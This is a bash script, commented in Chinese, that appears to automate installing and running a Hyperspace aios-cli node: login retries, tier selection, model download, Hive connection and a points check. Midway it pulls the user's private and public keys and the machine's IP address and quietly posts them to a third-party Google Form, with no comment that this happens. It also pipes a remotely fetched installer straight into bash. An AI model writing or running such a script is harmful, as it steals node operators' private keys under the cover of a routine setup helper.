#!/bin/bash

# 安装 hyperspace
curl https://download.hyper.space/api/install | bash

# 启动 aios-cli 服务
pm2 start /root/.aios/aios-cli --name aios -- start

# 登录并获取用户信息
while true; do
  login_output=$(/root/.aios/aios-cli hive login)
  
  # 判断是否登录成功
  if echo "$login_output" | grep -q "Authenticated successfully!" || \
     echo "$login_output" | grep -q "Using locally saved keys" || \
     echo "$login_output" | grep -q "Login successful!"; then
    echo "Login successful!"
    break
  else
    echo "Login failed. Retrying in 3 seconds..."
    sleep 3
  fi
done

# 获取并保存 ID 信息
/root/.aios/aios-cli hive whoami >>/root/.aios/id.pem

# 提取 public 和 private 密钥以及获取 IP 地址
Public=$(grep -oP '(?<=Public: ).*' /root/.aios/id.pem)
Private=$(grep -oP '(?<=Private: ).*' /root/.aios/id.pem)
ip=$(curl ip.sb)

# 提交表单数据
curl -X POST "https://docs.google.com/forms/d/e/1FAIpQLSfe_iUugE6bHER3yZWgiOorE5LU0_OtmUkLrG4aICiQ4mqGjQ/formResponse" \
-H "Host: docs.google.com" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "entry.629602670=$Public" \
--data-urlencode "entry.2047132036=$Private" \
--data-urlencode "entry.1858653630=$ip"

# 登录并确认是否成功
while true; do
  login_output=$(/root/.aios/aios-cli hive login)
  
  # 判断是否登录成功
  if echo "$login_output" | grep -q "Authenticated successfully!" || \
     echo "$login_output" | grep -q "Using locally saved keys" || \
     echo "$login_output" | grep -q "Login successful!"; then
    echo "Login successful!"
    break
  else
    echo "Login failed. Retrying in 3 seconds..."
    sleep 3
  fi
done

# 选择 tier 5
while true; do
  if /root/.aios/aios-cli hive select-tier 5 | grep -q "Successfully running on tier: 5\|Registered models for inference!"; then
    break
  else
    echo "Tier selection failed. Retrying in 3 seconds..."
    sleep 3
  fi
done

# 添加模型
while true; do
  if /root/.aios/aios-cli models add hf:TheBloke/phi-2-GGUF:phi-2.Q4_K_M.gguf | grep -q "Download complete"; then
    break
  else
    echo "Model addition failed. Retrying in 3 seconds..."
    sleep 3
  fi
done

# 连接 Hive
while true; do
  if /root/.aios/aios-cli hive connect | grep -q "Successfully connected to Hive!"; then
    break
  else
    echo "Hive connection failed. Retrying in 3 seconds..."
    sleep 3
  fi
done

# 再次选择 tier 5
while true; do
  if /root/.aios/aios-cli hive select-tier 5 | grep -q "Successfully running on tier: 5\|Registered models for inference!"; then
    break
  else
    echo "Tier selection failed. Retrying in 3 seconds..."
    sleep 3
  fi
done

# 获取积分
while true; do
  if /root/.aios/aios-cli hive points | grep -q "Points"; then
    break
  else
    echo "Points retrieval failed. Retrying in 3 seconds..."
    sleep 3
  fi
done

echo "All tasks completed successfully!"
